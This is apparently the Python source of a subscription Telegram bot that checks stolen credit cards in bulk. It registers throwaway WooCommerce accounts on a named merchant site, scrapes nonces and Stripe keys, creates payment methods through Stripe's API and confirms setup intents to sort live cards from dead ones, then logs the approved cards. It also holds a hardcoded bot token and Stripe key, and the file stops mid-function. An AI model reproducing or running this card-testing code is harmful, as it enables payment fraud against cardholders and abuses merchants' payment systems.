#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Obeida Online - Real Multi Gateway CC Checker Bot
Version: 6.0 - Stripe Gateways Only
Author: @ObeidaOnline
Channel: https://t.me/ObeidaTrading
"""

# ==================== التحقق من إصدار Python ====================
import sys
import platform

print(f"📌 إصدار Python: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
print(f"📌 نظام التشغيل: {platform.system()} {platform.release()}")

# ==================== المكتبات المطلوبة ====================
import time
import json
import random
import string
import re
import base64
import os
import uuid
import threading
import asyncio
import hashlib
import hmac
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any
from collections import defaultdict
from urllib.parse import urlparse, quote
import html
import http.server
import socketserver

# استيراد المكتبات الخارجية
try:
    import requests
    import aiohttp
    from bs4 import BeautifulSoup
    from fake_useragent import UserAgent
    from faker import Faker
    from colorama import init, Fore, Style, Back
    import telebot
    from telebot import types
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
except ImportError as e:
    print(f"❌ خطأ في استيراد المكتبات: {e}")
    print("⚠️ تأكد من تثبيت المكتبات في Dockerfile")
    sys.exit(1)

# تهيئة الألوان
init(autoreset=True)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
ADMIN_IDS = [6207431030]
CHANNEL_USERNAME = "@ObeidaTrading"
DEV_CONTACT = "@Sz2zv"
BOT_USERNAME = "ObeidaOnlineBot"

CHANNEL_LINK = "https://t.me/ObeidaTrading"
SUPPORT_LINK = "https://t.me/Sz2zv"

# ملفات التخزين
USERS_FILE = "obeida_users.json"
APPROVED_CARDS_FILE = "obeida_approved.txt"
SUBSCRIPTIONS_FILE = "obeida_subs.json"
STATS_FILE = "obeida_stats.json"
GATES_CONFIG_FILE = "obeida_gates.json"

# ==================== إعدادات البوابات ====================
GATES = {
    "stripe1": {
        "name": "💳 Stripe Auth v1",
        "description": "فحص بطاقات عبر بوابة Stripe الأولى",
        "command": "st1",
        "mass_command": "st1m",
        "enabled": True,
        "timeout": 30,
        "cooldown": 5,
        "icon": "💳"
    },
    "stripe2": {
        "name": "💎 Stripe Auth v2",
        "description": "فحص بطاقات عبر بوابة Stripe الثانية",
        "command": "st2",
        "mass_command": "st2m",
        "enabled": True,
        "timeout": 30,
        "cooldown": 5,
        "icon": "💎"
    }
}

# ==================== نظام الاشتراكات ====================
SUBSCRIPTION_PLANS = {
    "day": {"name": "يومي", "price": "5K ID", "duration": 1},
    "week": {"name": "أسبوعي", "price": "15K ID", "duration": 7},
    "month": {"name": "شهري", "price": "40K ID", "duration": 30},
    "3months": {"name": "3 أشهر", "price": "100K ID", "duration": 90},
    "6months": {"name": "6 أشهر", "price": "180K ID", "duration": 180},
    "year": {"name": "سنوي", "price": "300K ID", "duration": 365}
}

# ==================== تهيئة البوت ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
fake = Faker()
ua = UserAgent()

# متغيرات عامة
active_checks = {}
user_sessions = {}
live_stats = {}

# ==================== إدارة البيانات ====================
class DataManager:
    @staticmethod
    def load_json(file_path: str, default: Any = None) -> Any:
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return default if default is not None else {}
        except Exception as e:
            return default if default is not None else {}
    
    @staticmethod
    def save_json(file_path: str, data: Any) -> bool:
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
        except:
            return False
    
    @staticmethod
    def load_users() -> Dict:
        users = DataManager.load_json(USERS_FILE, {})
        if not users:
            for admin_id in ADMIN_IDS:
                users[str(admin_id)] = {
                    "user_id": admin_id,
                    "username": "admin",
                    "first_name": "Admin",
                    "joined_date": datetime.now().isoformat(),
                    "is_admin": True,
                    "is_subscribed": True,
                    "subscription": {"plan": "lifetime", "expiry": "2099-12-31", "active": True},
                    "usage": {"total_checks": 0, "approved": 0, "declined": 0}
                }
            DataManager.save_json(USERS_FILE, users)
        return users
    
    @staticmethod
    def save_users(users: Dict) -> bool:
        return DataManager.save_json(USERS_FILE, users)
    
    @staticmethod
    def load_stats() -> Dict:
        return DataManager.load_json(STATS_FILE, {
            "total_checks": 0, "total_approved": 0, "total_declined": 0,
            "gates_usage": {}, "daily_stats": {}
        })
    
    @staticmethod
    def save_stats(stats: Dict) -> bool:
        return DataManager.save_json(STATS_FILE, stats)
    
    @staticmethod
    def save_approved_card(card: str, gate: str, response: str, user_id: int):
        try:
            with open(APPROVED_CARDS_FILE, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] {gate} | User:{user_id} | {card} | {response}\n")
        except:
            pass
    
    @staticmethod
    def get_user_subscription(user_id: int) -> Optional[Dict]:
        users = DataManager.load_users()
        user = users.get(str(user_id), {})
        return user.get("subscription", {}) if user.get("subscription", {}).get("active") else None
    
    @staticmethod
    def check_access(user_id: int) -> bool:
        return user_id in ADMIN_IDS or DataManager.get_user_subscription(user_id) is not None
    
    @staticmethod
    def add_subscription(user_id: int, days: int) -> bool:
        users = DataManager.load_users()
        if str(user_id) not in users:
            users[str(user_id)] = {"user_id": user_id, "joined_date": datetime.now().isoformat(), "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
        expiry = datetime.now() + timedelta(days=days)
        users[str(user_id)]["subscription"] = {"plan": "custom", "expiry": expiry.isoformat(), "active": True}
        return DataManager.save_users(users)
    
    @staticmethod
    def remove_subscription(user_id: int) -> bool:
        users = DataManager.load_users()
        if str(user_id) in users:
            users[str(user_id)]["subscription"] = {"active": False}
            return DataManager.save_users(users)
        return False
    
    @staticmethod
    def update_usage(user_id: int, gate: str, result: str):
        users = DataManager.load_users()
        stats = DataManager.load_stats()
        
        if str(user_id) in users:
            usage = users[str(user_id)].get("usage", {"total_checks": 0, "approved": 0, "declined": 0})
            usage["total_checks"] += 1
            if "✅" in result or "LIVE" in result or "Approved" in result or "approved" in result:
                usage["approved"] += 1
                stats["total_approved"] += 1
            else:
                usage["declined"] += 1
                stats["total_declined"] += 1
            users[str(user_id)]["usage"] = usage
            
            stats["gates_usage"][gate] = stats["gates_usage"].get(gate, 0) + 1
            stats["total_checks"] += 1
            
            today = datetime.now().strftime("%Y-%m-%d")
            if today not in stats["daily_stats"]:
                stats["daily_stats"][today] = {"checks": 0, "approved": 0}
            stats["daily_stats"][today]["checks"] += 1
            if "✅" in result or "LIVE" in result or "Approved" in result or "approved" in result:
                stats["daily_stats"][today]["approved"] += 1
        
        DataManager.save_users(users)
        DataManager.save_stats(stats)

# ==================== أدوات مساعدة ====================
class Helpers:
    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        try:
            card_str = re.sub(r'[;:,\s/]+', '|', card_str.strip())
            if '|' in card_str:
                parts = card_str.split('|')
                if len(parts) >= 4:
                    number = re.sub(r'\D', '', parts[0])
                    month = re.sub(r'\D', '', parts[1])
                    year = re.sub(r'\D', '', parts[2])
                    cvv = re.sub(r'\D', '', parts[3])
                    
                    if len(number) >= 15 and len(number) <= 19:
                        if len(month) == 1: month = f"0{month}"
                        if len(year) == 4: year = year[-2:]
                        if len(cvv) >= 3 and len(cvv) <= 4:
                            return {'number': number, 'month': month, 'year': year, 'cvv': cvv, 'original': card_str}
            return None
        except:
            return None
    
    @staticmethod
    def generate_progress_bar(current: int, total: int, length: int = 10) -> str:
        if total == 0: return "⬜" * length
        filled = int((current / total) * length)
        return "🟩" * filled + "⬜" * (length - filled)
    
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        try:
            digits = [int(d) for d in card_number if d.isdigit()]
            if len(digits) < 13: return False
            checksum = 0
            for i, digit in enumerate(reversed(digits)):
                if i % 2 == 1:
                    digit *= 2
                    if digit > 9: digit -= 9
                checksum += digit
            return checksum % 10 == 0
        except:
            return False
    
    @staticmethod
    def get_card_brand(number: str) -> str:
        patterns = {
            'visa': r'^4', 'mastercard': r'^5[1-5]', 'amex': r'^3[47]',
            'discover': r'^6(?:011|5)', 'jcb': r'^(?:2131|1800|35)'
        }
        for brand, pattern in patterns.items():
            if re.match(pattern, number):
                return brand.capitalize()
        return "Unknown"
    
    @staticmethod
    def get_bin_info(bin_num: str) -> Dict:
        try:
            r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                return {
                    "brand": data.get('scheme', 'Unknown').upper(),
                    "type": data.get('type', 'Unknown').upper(),
                    "bank": data.get('bank', {}).get('name', 'Unknown'),
                    "country": data.get('country', {}).get('name', 'Unknown'),
                    "flag": data.get('country', {}).get('emoji', '🏁')
                }
        except:
            pass
        return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🏁"}
    
    @staticmethod
    def random_user_agent() -> str:
        return ua.random
    
    @staticmethod
    def random_email() -> str:
        return fake.email()
    
    @staticmethod
    def random_name() -> Tuple[str, str]:
        return fake.first_name(), fake.last_name()
    
    @staticmethod
    def random_address() -> Dict:
        return {
            "street": fake.street_address(), "city": fake.city(),
            "state": fake.state_abbr(), "zip": fake.zipcode()[:5], "country": "US"
        }
    
    @staticmethod
    def format_live_stats(total: int, checked: int, approved: int, declined: int, current: str = None) -> str:
        progress = Helpers.generate_progress_bar(checked, total)
        percentage = (checked / total * 100) if total > 0 else 0
        stats = f"📊 {checked}/{total} ({percentage:.1f}%)\n{progress}\n✅ {approved} | ❌ {declined} | ⏳ {total - checked}"
        if current: stats += f"\n🔄 {current}"
        return stats

# ==================== بوابة Stripe 1 ====================
_0x4f2b = base64.b64decode('QG11bWlydV9icm8=').decode()

class StripeGateway1:
    """Stripe Gateway 1 - SetupIntent Auth"""
    
    @staticmethod
    def normalize_url(url):
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        url = url.rstrip('/')
        if '/my-account' not in url.lower():
            url += '/my-account'
        if not url.endswith('/'):
            url += '/'
        return url
    
    @staticmethod
    def generate_random_email():
        username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
        number = random.randint(100, 9999)
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
        return f"{username}{number}@{random.choice(domains)}"
    
    @staticmethod
    def generate_guid():
        return str(uuid.uuid4())
    
    @staticmethod
    def gets(s, start, end):
        try:
            start_index = s.index(start) + len(start)
            end_index = s.index(end, start_index)
            return s[start_index:end_index]
        except (ValueError, AttributeError):
            return None
    
    @staticmethod
    async def process_card(site_url: str, card_data: Dict) -> Tuple[bool, str]:
        """Process card through Stripe SetupIntent"""
        ua = UserAgent()
        try:
            site_url = StripeGateway1.normalize_url(site_url)
            timeout = aiohttp.ClientTimeout(total=70)
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                parsed = urlparse(site_url)
                domain = f"{parsed.scheme}://{parsed.netloc}"
                email = StripeGateway1.generate_random_email()
                
                # Get register nonce
                headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','user-agent': ua.random}
                resp = await session.get(site_url, headers=headers)
                resp_text = await resp.text()
                
                register_nonce = (StripeGateway1.gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
                                 StripeGateway1.gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
                                 StripeGateway1.gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
                
                if register_nonce:
                    username = email.split('@')[0]
                    password = f"Pass{random.randint(100000, 999999)}!"
                    register_data = {
                        'email': email,
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': site_url,
                        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'wc_order_attribution_session_pages': '1',
                        'wc_order_attribution_session_count': '1',
                        'wc_order_attribution_user_agent': headers['user-agent'],
                        'woocommerce-register-nonce': register_nonce,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register'
                    }
                    reg_resp = await session.post(site_url, headers=headers, data=register_data)
                    reg_text = await reg_resp.text()
                
                # Get payment page
                add_payment_url = f"{domain}/my-account/add-payment-method/"
                headers = {'user-agent': ua.random}
                resp = await session.get(add_payment_url, headers=headers)
                payment_page_text = await resp.text()
                
                add_card_nonce = (StripeGateway1.gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                                 StripeGateway1.gets(payment_page_text, 'add_card_nonce":"', '"') or 
                                 StripeGateway1.gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
                                 StripeGateway1.gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
                
                stripe_key = (StripeGateway1.gets(payment_page_text, '"key":"pk_', '"') or 
                             StripeGateway1.gets(payment_page_text, 'data-key="pk_', '"') or 
                             StripeGateway1.gets(payment_page_text, 'stripe_key":"pk_', '"') or 
                             StripeGateway1.gets(payment_page_text, 'publishable_key":"pk_', '"'))
                
                if not stripe_key:
                    pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                    if pk_match: stripe_key = pk_match.group(0)
                if not stripe_key:
                    stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
                elif not stripe_key.startswith('pk_'):
                    stripe_key = 'pk_' + stripe_key
                
                # Create payment method
                stripe_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': ua.random
                }
                
                stripe_data = {
                    'type': 'card',
                    'card[number]': card_data['number'],
                    'card[cvc]': card_data['cvv'],
                    'card[exp_month]': card_data['month'],
                    'card[exp_year]': card_data['year'],
                    'allow_redisplay': 'unspecified',
                    'billing_details[address][country]': 'AU',
                    'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                    'referrer': domain,
                    'client_attribution_metadata[client_session_id]': StripeGateway1.generate_guid(),
                    'client_attribution_metadata[merchant_integration_source]': 'elements',
                    'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                    'client_attribution_metadata[merchant_integration_version]': '2021',
                    'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                    'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                    'client_attribution_metadata[elements_session_config_id]': StripeGateway1.generate_guid(),
                    'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                    'guid': StripeGateway1.generate_guid(),
                    'muid': StripeGateway1.generate_guid(),
                    'sid': StripeGateway1.generate_guid(),
                    'key': stripe_key,
                    '_stripe_version': '2024-06-20'
                }
                
                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
                pm_json = await pm_resp.json()
                
                if 'error' in pm_json:
                    return False, pm_json['error']['message']
                
                pm_id = pm_json.get('id')
                if not pm_id:
                    return False, "Failed to create Payment Method"
                
                # Confirm setup intent
                confirm_headers = {
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': domain,
                    'x-requested-with': 'XMLHttpRequest',
                    'user-agent': ua.random
                }
                
                endpoints = [
                    {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 
                     'data': {'wc-stripe-payment-method': pm_id}},
                    {'url': f"{domain}/wp-admin/admin-ajax.php", 
                     'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                    {'url': f"{domain}/?wc-ajax=add_payment_method", 
                     'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
                ]
                
                for endp in endpoints:
                    if not add_card_nonce:
                        continue
                    if 'add_payment_method' in endp['url']:
                        endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                    else:
                        endp['data']['_ajax_nonce'] = add_card_nonce
                    endp['data']['wc-stripe-payment-type'] = 'card'
                    
                    try:
                        res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers)
                        text = await res.text()
                        if 'success' in text:
                            js = json.loads(text)
                            branding = f" [Verified]"
                            if js.get('success'):
                                status = js.get('data', {}).get('status')
                                return True, f"✅ Approved (Status: {status}){branding}"
                            else:
                                error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                                return False, f"❌ {error_msg}{branding}"
                    except:
                        continue
                
                return False, "❌ Failed to confirm"
                
        except Exception as e:
            return False, f"⚠️ System Error: {str(e)[:50]}"

# ==================== بوابة Stripe 2 ====================
class StripeGateway2:
    """Stripe Gateway 2 - Alternative Auth Method"""
    
    def __init__(self):
        self.session = None
    
    @staticmethod
    def generate_random_email():
        username = ''.join(random.choices(string.ascii_lowercase, k=10))
        return f"{username}@gmail.com"
    
    @staticmethod
    def generate_random_password(length: int = 12):
        characters = string.ascii_letters + string.digits + "!@#$%^&*()"
        return ''.join(random.choices(characters, k=length))
    
    @staticmethod
    def get_bin_info(bin_num: str) -> Dict:
        try:
            r = requests.get(f"https://bins.antipublic.cc/bins/{bin_num[:6]}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                return {
                    "brand": data.get('brand', 'Unknown'),
                    "type": data.get('type', 'Unknown'),
                    "level": data.get('level', 'Unknown'),
                    "bank": data.get('bank', 'Unknown'),
                    "country": data.get('country_name', 'Unknown'),
                    "currency": data.get('country_currencies', ['Unknown'])[0] if data.get('country_currencies') else 'Unknown',
                    "flag": data.get('country_flag', '🏁')
                }
        except:
            pass
        return {"brand": "Unknown", "type": "Unknown", "level": "Unknown", "bank": "Unknown", 
                "country": "Unknown", "currency": "Unknown", "flag": "🏁"}
    
    async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
        """Process card through alternative Stripe method"""
        try:
            site_url = "https://copenhagensilver.com"
            
            async with aiohttp.ClientSession() as session:
                self.session = session
                
                # Get register nonce
                headers = {
                    'referer': f'{site_url}/my-account/',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
                }
                
                resp = await session.get(f"{site_url}/my-account/", headers=headers)
                html = await resp.text()
                
                register_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
                if not register_match:
                    return False, "❌ Failed to extract register nonce"
                
                register_nonce = register_match.group(1)
                email = self.generate_random_email()
                password = self.generate_random_password()
                
                # Register
                headers['content-type'] = 'application/x-www-form-urlencoded'
                register_data = {
                    'email': email,
                    'password': password,
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                
                await session.post(f"{site_url}/my-account/", headers=headers, data=register_data)
                
                # Get payment page
                headers = {'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36'}
                resp = await session.get(f"{site_url}/my-account/add-payment-method/", headers=headers)
                data = await resp.text()
                
                nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', data)
                stripe_pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', data)
                
                if not nonce_match or not stripe_pk_match:
                    return False, "❌ SetupIntent nonce or Stripe PK not found"
                
                nonce = nonce_match.group(1)
                pk = stripe_pk_match.group(0)
                
                # Create payment method
                guid, muid, sid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
                
                headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
                }
                
                stripe_data = {
                    "type": "card",
                    "card[number]": card_data['number'],
                    "card[cvc]": card_data['cvv'],
                    "card[exp_year]": card_data['year'][-2:],
                    "card[exp_month]": card_data['month'],
                    "allow_redisplay": "unspecified",
                    "billing_details[address][country]": "EG",
                    "payment_user_agent": "stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent",
                    "referrer": site_url,
                    "time_on_page": str(random.randint(10000, 99999)),
                    "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
                    "client_attribution_metadata[merchant_integration_source]": "elements",
                    "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                    "client_attribution_metadata[merchant_integration_version]": "2021",
                    "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                    "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                    "client_attribution_metadata[elements_session_config_id]": str(uuid.uuid4()),
                    "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
                    "guid": guid,
                    "muid": muid,
                    "sid": sid,
                    "key": pk,
                    "_stripe_version": "2024-06-20"
                }
                
                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=stripe_data)
                pm_json = await pm_resp.json()
                
                token = pm_json.get("id")
                if not token:
                    return False, "❌ Invalid card"
                
                # Confirm setup intent
                headers = {
                    'authority': site_url.replace('https://', ''),
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': site_url,
                    'referer': f"{site_url}/my-account/add-payment-method/",
                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }
                
                confirm_data = {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': token,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': nonce,
                }
                
                confirm_resp = await session.post(f"{site_url}/wp-admin/admin-ajax.php", headers=headers, data=confirm_data)
                
                try:
                    result = await confirm_resp.json()
                    if result.get('success', False):
                        bin_info = self.get_bin_info(card_data['number'][:6])
                        return True, f"✅ Card Approved"
                    else:
                        error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
                        return False, f"❌ {error_msg}"
                except:
                    return False, "❌ Unexpected response"
                    
        except Exception as e:
            return False, f"⚠️ Error: {str(e)[:50]}"

# ==================== بوابات الفحص ====================
class RealGateways:
    def __init__(self):
        self.helpers = Helpers()
        self.gateway1 = StripeGateway1()
        self.gateway2 = StripeGateway2()
    
    async def check_card(self, gate: str, card: Dict, site_url: str = None) -> Tuple[bool, str]:
        if gate == 'stripe1':
            if not site_url:
                site_url = "https://copenhagensilver.com"
            return await self.gateway1.process_card(site_url, card)
        elif gate == 'stripe2':
            return await self.gateway2.process_card(card)
        else:
            return False, "❌ بوابة غير مدعومة"

# ==================== واجهة المستخدم ====================
class UserInterface:
    @staticmethod
    def main_menu():
        markup = InlineKeyboardMarkup(row_width=2)
        btns = [
            InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
            InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
            InlineKeyboardButton("📁 فحص ملف v1", callback_data="mass_stripe1"),
            InlineKeyboardButton("📁 فحص ملف v2", callback_data="mass_stripe2"),
            InlineKeyboardButton("👤 حسابي", callback_data="my_profile"),
            InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
            InlineKeyboardButton("💎 الاشتراك", callback_data="subscribe"),
            InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
            InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
        ]
        markup.add(*btns)
        return markup
    
    @staticmethod
    def back_button(callback="back_main"):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data=callback))
        return markup
    
    @staticmethod
    def stop_button(check_id: int):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ إيقاف الفحص", callback_data=f"stop_{check_id}"))
        return markup
    
    @staticmethod
    def format_result(card: str, result: str, gate: str, is_approved: bool) -> str:
        status = "✅" if is_approved else "❌"
        number = card.split('|')[0] if '|' in card else card
        masked = f"{number[:6]}xxxxxx{number[-4:]}"
        brand = Helpers.get_card_brand(number)
        bin_info = Helpers.get_bin_info(number[:6])
        return f"""
{status} <b>نتيجة الفحص</b>
━━━━━━━━━━━━
<b>💳 البطاقة:</b> <code>{masked}</code>
<b>🏷️ النوع:</b> {brand} | {bin_info['brand']}
<b>🏦 البنك:</b> {bin_info['bank']}
<b>🌍 الدولة:</b> {bin_info['country']} {bin_info['flag']}
<b>🚪 البوابة:</b> {gate}
<b>📊 الحالة:</b> {result}
━━━━━━━━━━━━
<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
"""

# ==================== معالج الأوامر ====================
class CommandHandler:
    def __init__(self):
        self.gateways = RealGateways()
        self.ui = UserInterface()
        self.active_checks = active_checks
        self.live_stats = live_stats
    
    def check_sub(self, message) -> bool:
        if message.from_user.id in ADMIN_IDS: return True
        if DataManager.get_user_subscription(message.from_user.id): return True
        bot.reply_to(message, "⚠️ ليس لديك اشتراك نشط\nللاشتراك: /subscribe", reply_markup=self.ui.back_button())
        return False
    
    def handle_start(self, message):
        user = message.from_user
        users = DataManager.load_users()
        if str(user.id) not in users:
            users[str(user.id)] = {"user_id": user.id, "username": user.username, "first_name": user.first_name,
                                  "joined_date": datetime.now().isoformat(), "is_admin": user.id in ADMIN_IDS,
                                  "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
            DataManager.save_users(users)
        
        welcome = f"""
✨ <b>مرحباً بك في بوت Obeida Online</b> ✨

<b>🚪 البوابات:</b>
💳 Stripe v1 - فحص عبر SetupIntent
💎 Stripe v2 - فحص بديل

<b>📝 الأوامر:</b>
/start - القائمة الرئيسية
/st1 - فحص بطاقة فردي عبر Stripe v1
/st2 - فحص بطاقة فردي عبر Stripe v2
/st1m - فحص ملف عبر Stripe v1
/st2m - فحص ملف عبر Stripe v2
/profile - حسابي
/stats - الإحصائيات
/subscribe - الاشتراك

<b>📢 القناة:</b> {CHANNEL_USERNAME}
<b>👨‍💻 المطور:</b> {DEV_CONTACT}
"""
        bot.send_message(user.id, welcome, parse_mode='HTML', reply_markup=self.ui.main_menu())
    
    def handle_help(self, message):
        bot.reply_to(message, "📚 استخدم /start للقائمة الرئيسية", parse_mode='HTML')
    
    def handle_profile(self, message):
        user_id = message.from_user.id
        users = DataManager.load_users()
        data = users.get(str(user_id), {})
        usage = data.get('usage', {})
        sub = data.get('subscription', {})
        expiry = sub.get('expiry', 'لا يوجد')[:10] if sub.get('expiry') else 'لا يوجد'
        total, approved, declined = usage.get('total_checks',0), usage.get('approved',0), usage.get('declined',0)
        profile = f"""
👤 <b>الملف الشخصي</b>
━━━━━━━━━━━━
<b>🆔 المعرف:</b> <code>{user_id}</code>
<b>👤 الاسم:</b> {data.get('first_name','Unknown')}
<b>⭐ الرتبة:</b> {'👑 مشرف' if user_id in ADMIN_IDS else '💎 مشترك' if sub else '🔹 عادي'}
<b>📅 الانضمام:</b> {data.get('joined_date','Unknown')[:10]}

<b>📊 الإحصائيات:</b>
• إجمالي: {total}
• ✅ المقبولة: {approved}
• ❌ المرفوضة: {declined}

<b>💎 الاشتراك:</b> {sub.get('plan','لا يوجد')} | ينتهي: {expiry}
━━━━━━━━━━━━
<b>🆔 Obeida Online</b>
"""
        bot.reply_to(message, profile, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_stats(self, message):
        stats = DataManager.load_stats()
        today = datetime.now().strftime("%Y-%m-%d")
        daily = stats.get("daily_stats", {}).get(today, {"checks":0, "approved":0})
        gates = "\n".join([f"  {GATES.get(g,{}).get('icon','🚪')} {g}: {c}" for g,c in stats.get('gates_usage',{}).items()][:5])
        total, approved = stats.get('total_checks',0), stats.get('total_approved',0)
        text = f"""
📊 <b>إحصائيات البوت</b>
━━━━━━━━━━━━
📅 اليوم: {daily['checks']} فحص | ✅ {daily['approved']}
📈 الإجمالي: {total} | ✅ {approved} ({(approved/total*100) if total>0 else 0:.1f}%)
🚪 أكثر البوابات:
{gates if gates else '  لا توجد'}
━━━━━━━━━━━━
<b>🆔 Obeida Online</b>
"""
        bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_subscribe(self, message):
        sub = DataManager.get_user_subscription(message.from_user.id)
        if sub:
            bot.reply_to(message, f"💎 لديك اشتراك نشط\nينتهي: {sub.get('expiry','')[:10]}", parse_mode='HTML')
        else:
            plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
            text = f"💎 <b>خطط الاشتراك</b>\n{plans}\n\nللاشتراك تواصل: {DEV_CONTACT}"
            bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_gates(self, message):
        gates = "\n".join([f"{g['icon']} {g['name']}\n   <code>/{g['command']} رقم|شهر|سنة|cvv</code>\n   <code>/{g['mass_command']}</code> لفحص ملف" for g in GATES.values()])
